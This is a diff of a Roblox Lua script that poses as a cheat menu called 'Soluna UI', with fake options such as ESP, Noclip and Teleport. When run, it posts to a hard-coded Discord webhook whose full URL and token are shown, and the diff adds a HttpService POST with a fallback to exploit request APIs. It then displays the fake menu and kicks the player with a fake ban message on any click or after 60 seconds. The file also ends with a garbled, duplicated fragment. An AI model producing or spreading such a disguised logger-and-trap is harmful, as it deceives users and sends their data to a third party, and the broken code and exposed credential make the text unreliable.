@@ -1,16 +1,10 @@
---[[  Fake Soluna UI + Trap + 60s Countdown
-     • Khi execute: gửi log ngay + hiện UI + bắt đầu đếm 60s
-     • Trong 60s: bấm bất kỳ nút nào -> kick ngay
-     • Hết 60s mà chưa bấm -> auto kick
---]]
 
--- // Services
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
--- // Webhook Discord (bạn đã cung cấp)
+-- // Webhook Discord
 local webhookUrl = "https://discord.com/api/webhooks/1259819377864478760/RS0hEyFNE2kEEmHnGrfJh9QNEdsxY7jJTKj1UVRnBy_yOJTx0l9LEc6uuJZag1nIvpw"
 
 -- // Ban message gốc
@@ -47,13 +41,22 @@ local function sendWebhook()
         }}
     }
     local json = HttpService:JSONEncode(data)
-    local req = syn and syn.request or http_request or request
-    if req then
-        pcall(function()
-            req({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = json })
-        end)
-    else
-        warn("Exploit không hỗ trợ HTTP request API")
+
+    -- Ưu tiên dùng HttpService (tương thích Roblox Studio + exploit hỗ trợ)
+    local success, err = pcall(function()
+        HttpService:PostAsync(webhookUrl, json, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if not success then
+        -- Fallback dùng syn.request/http_request nếu hỗ trợ
+        local req = syn and syn.request or http_request or request
+        if req then
+            pcall(function()
+                req({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = json })
+            end)
+        else
+            warn("Không thể gửi webhook: exploit không hỗ trợ HTTP request API")
+        end
     end
 end
 
@@ -104,6 +107,97 @@ local sSide = Instance.new("UIStroke", side) sSide.Color = Color3.fromRGB(55,55,
 
 local sideList = Instance.new("UIListLayout", side)
 sideList.Padding = UDim.new(0, 8)
+sideList.SortOrder = Enum.SortOrder.LayoutOrder
+sideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+sideList.VerticalAlignment = Enum.VerticalAlignment.Top
+
+-- Content
+local content = Instance.new("Frame", main)
+content.Size = UDim2.new(1, -170, 1, -60)
+content.Position = UDim2.new(0, 160, 0, 60)
+content.BackgroundColor3 = Color3.fromRGB(30,30,34)
+local cCont = Instance.new("UICorner", content) cCont.CornerRadius = UDim.new(0, 12)
+local sCont = Instance.new("UIStroke", content) sCont.Color = Color3.fromRGB(60,60,66) sCont.Thickness = 1
+
+local contList = Instance.new("UIListLayout", content)
+contList.Padding = UDim.new(0, 10)
+contList.SortOrder = Enum.SortOrder.LayoutOrder
+contList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+contList.VerticalAlignment = Enum.VerticalAlignment.Top
+
+-- Helper: tạo nút đẹp
+local function makeButton(parent, text)
+    local btn = Instance.new("TextButton")
+    btn.Parent = parent
+    btn.Size = UDim2.new(1, -24, 0, 40)
+    btn.BackgroundColor3 = Color3.fromRGB(42,44,50)
+    btn.Text = "  " .. text
+    btn.TextColor3 = Color3.fromRGB(235,235,238)
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+    btn.Font = Enum.Font.Gotham
+    btn.TextSize = 16
+    btn.AutoButtonColor = false
+
+    local c = Instance.new("UICorner", btn) c.CornerRadius = UDim.new(0, 10)
+    local st = Instance.new("UIStroke", btn) st.Color = Color3.fromRGB(70,72,80) st.Thickness = 1
+
+    btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(50,52,58) end)
+    btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(42,44,50) end)
+
+    return btn
+end
+
+-- Nút sidebar
+local sideTabs = {"Credits","Player","Legit","Rage","Parry","ESP","Sounds","Changer","World","Misc"}
+local allButtons = {}
+
+for _, name in ipairs(sideTabs) do
+    local b = makeButton(side, name)
+    table.insert(allButtons, b)
+end
+
+-- Các option trong Content (tab Player)
+local options = {
+    "Teleport",
+    "Infinite Stamina",
+    "No Fall Damage",
+    "Noclip [BETA]",
+    "Disable Utilities Damage",
+    "Anti-Ragdoll"
+}
+for _, name in ipairs(options) do
+    local b = makeButton(content, name)
+    table.insert(allButtons, b)
+end
+
+-- ======================================================
+-- Countdown 60s + Trap click (không hiển thị text)
+-- ======================================================
+local COUNTDOWN = 60
+local start = os.clock()
+local kicked = false
+
+local function onAnyButtonClicked()
+    if kicked then return end
+    kicked = true
+    player:Kick(banMessage)
+end
+
+for _, b in ipairs(allButtons) do
+    b.MouseButton1Click:Connect(onAnyButtonClicked)
+end
+
+task.spawn(function()
+    while not kicked do
+        local elapsed = math.floor(os.clock() - start)
+        if elapsed >= COUNTDOWN then
+            kicked = true
+            player:Kick(banMessage)
+            break
+        end
+        task.wait(1)
+    end
+end)sideList.Padding = UDim.new(0, 8)
 sideList.SortOrder = Enum.SortOrder.LayoutOrder
 sideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
 sideList.VerticalAlignment = Enum.VerticalAlignment.Top
